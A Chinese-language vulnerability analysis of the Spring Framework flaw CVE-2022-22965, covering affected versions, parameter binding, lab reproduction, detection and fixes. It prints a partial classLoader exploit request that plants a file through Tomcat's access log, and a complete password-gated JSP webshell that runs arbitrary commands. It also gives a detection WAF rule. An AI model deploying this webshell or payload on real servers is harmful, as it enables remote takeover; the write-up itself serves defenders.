
## 一、漏洞概况
### 基本信息
- **CVE编号**：CVE-2022-22965
- **披露时间**：2022年3月31日
- **官方通告**：[Spring Framework RCE Early Announcement](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)

### 影响范围
| 组件              | 受影响版本                | 安全版本                  |
|-------------------|--------------------------|--------------------------|
| Spring Framework  | <5.3.18, <5.2.20         | ≥5.3.18, ≥5.2.20         |
| JDK               | ≥9                       | <9                       |
| Tomcat            | 部分版本需组合验证        | 见测试结果表              |

### Tomcat版本测试结果
| JDK版本            | Tomcat版本           | 结果                 |
|--------------------|---------------------|----------------------|
| jdk8u322-b06      | apache-tomcat-8.5.77 | 安全                 |
| jdk-9.0.4+11      | apache-tomcat-9.0.60 | 存在漏洞             |
| jdk-11.0.14.1+1   | apache-tomcat-8.5.78 | 安全（日志报错）     |
![[Pasted image 20250212023811.png]]
---

## 二、技术原理
### Spring参数绑定机制
通过URL参数自动绑定对象属性：
```java
// 示例请求
http://localhost:8083/addUser?name=wuya&department.name=sec

// 自动生成对象
User{name="wuya", department=Department{name="sec"}}
```

### 多级参数绑定
```python
contry.province.city.district=yuelu
```
调用链路：
1. `Contry.getProvince()`
2. `Province.getCity()`
3. `City.setDistrict()`

### 关键组件
- **BeanWrapperImpl**：Spring属性操作核心类
- **AccessLogValve**：Tomcat访问日志配置对象

---

## 三、漏洞复现
### 环境要求
| 组件         | 版本              |
|-------------|-------------------|
| 操作系统     | Windows          |
| JDK          | 11.0.11          |
| Tomcat       | 9.0.60           |
| Spring Boot  | 2.6.3（禁用内置Tomcat） |

### 部署流程
4. 将`ROOT.war`部署至`tomcat/webapps`目录
5. 配置Tomcat服务端参数：
   ```xml
   <!-- server.xml 配置示例 -->
   <Valve className="org.apache.catalina.valves.AccessLogValve"
          directory="logs"
          prefix="localhost_access_log"
          suffix=".txt"
          pattern="%h %l %u %t "%r" %s %b" />
   ```

### 漏洞利用脚本
```bash
python exploit.py --url http://localhost:7299/addUser
```

---

## 四、攻击原理
### HTTP Payload解析
```http
POST /addUser HTTP/1.1
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di...
```
关键参数说明：
- `pattern`：写入JSP木马的日志格式模板
- `suffix`：文件后缀设置为`.jsp`
- `directory`：木马存放路径为`webapps/ROOT`

### JSP木马代码
```jsp
<% 
if("j".equals(request.getParameter("pwd")){ 
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
    int a = -1; 
    byte[] b = new byte[2048]; 
    while((a=in.read(b))!=-1){ 
        out.println(new String(b)); 
    } 
} 
%>
```

---

## 五、漏洞排查
### 检测步骤
6. **组件检查**：
   - Spring Framework版本是否低于受影响版本
   - JDK版本是否≥9
   - Tomcat版本是否在受影响组合中

7. **流量特征**：
   - 包含`class.module.classLoader`的异常请求参数
   - 日志中出现非常规的`.jsp`文件生成记录

8. **日志分析**：
   ```bash
   grep -r "AccessLogValve" /tomcat/logs/catalina.*
   ```

---

## 六、修复方案
### 立即措施
9. **升级Spring框架**：
   ```xml
   <!-- Maven配置示例 -->
   <dependency>
       <groupId>org.springframework</groupId>
       <artifactId>spring-core</artifactId>
       <version>5.3.18</version>
   </dependency>
   ```

10. **Tomcat加固**：
   - 升级至Tomcat 8.5.78/9.0.62或更高版本
   - 禁用`AccessLogValve`的动态配置功能

11. **WAF规则**：
   ```nginx
   # 拦截包含class.module关键字的请求
   if ($args ~* "class\.module\.classLoader") {
       return 403;
   }
   ```

### 长期防护
- 启用RASP（运行时应用自我保护）
- 定期进行组件漏洞扫描

